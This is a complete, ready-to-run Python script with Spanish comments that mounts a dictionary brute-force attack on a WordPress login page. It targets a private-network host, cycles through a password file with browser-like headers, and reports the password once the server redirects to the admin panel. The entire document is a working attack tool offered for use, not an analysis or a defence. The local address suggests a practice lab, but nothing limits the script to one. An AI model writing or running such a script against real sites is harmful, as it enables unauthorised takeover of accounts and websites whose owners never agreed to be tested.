import requests
import time

# CONFIGURACIÓN DEL OBJETIVO
host = "192.168.0.137"
url_login = f"http://{host}/wp-login.php"
usuario = "wordpress-user"
diccionario = "passwords.txt"  # <-- Tu archivo .txt con contraseñas

# CABECERAS HTTP (simulan un navegador real)
headers = {
    "Host": host,
    "Origin": f"http://{host}",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Referer": f"http://{host}/wp-login.php",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "es-ES,es;q=0.9"
}

# COOKIE inicial de WordPress
cookies = {
    "wordpress_test_cookie": "WP Cookie check"
}

# CARGAR CONTRASEÑAS DESDE ARCHIVO
with open(diccionario, "r", encoding="utf-8", errors="ignore") as f:
    passwords = [line.strip() for line in f if line.strip()]

total = len(passwords)
print(f"🔍 Iniciando ataque de fuerza bruta contra WordPress en {host}")
print(f"📄 Diccionario cargado: {total} contraseñas\n")

start = time.time()

# PRUEBA UNA A UNA
for i, pwd in enumerate(passwords, start=1):
    data = {
        "log": usuario,
        "pwd": pwd,
        "wp-submit": "Log In",
        "redirect_to": f"http://{host}/wp-admin/",
        "testcookie": "1"
    }

    response = requests.post(url_login, data=data, headers=headers, cookies=cookies, allow_redirects=False)

    if response.status_code == 302 and "/wp-admin/" in response.headers.get("Location", ""):
        print(f"\n✅ ¡Contraseña encontrada!: {pwd} (intento #{i})")
        break
    else:
        if i % 50 == 0 or i == 1:
            elapsed = time.time() - start
            avg = elapsed / i
            remaining = avg * (total - i)
            print(f"[{i}/{total}] ❌ {pwd} — Tiempo estimado restante: {remaining:.1f} s")

else:
    print("\n🚫 No se encontró contraseña válida en el diccionario.")

end = time.time()
print(f"\n⏱️ Ataque finalizado en {end - start:.2f} segundos.")
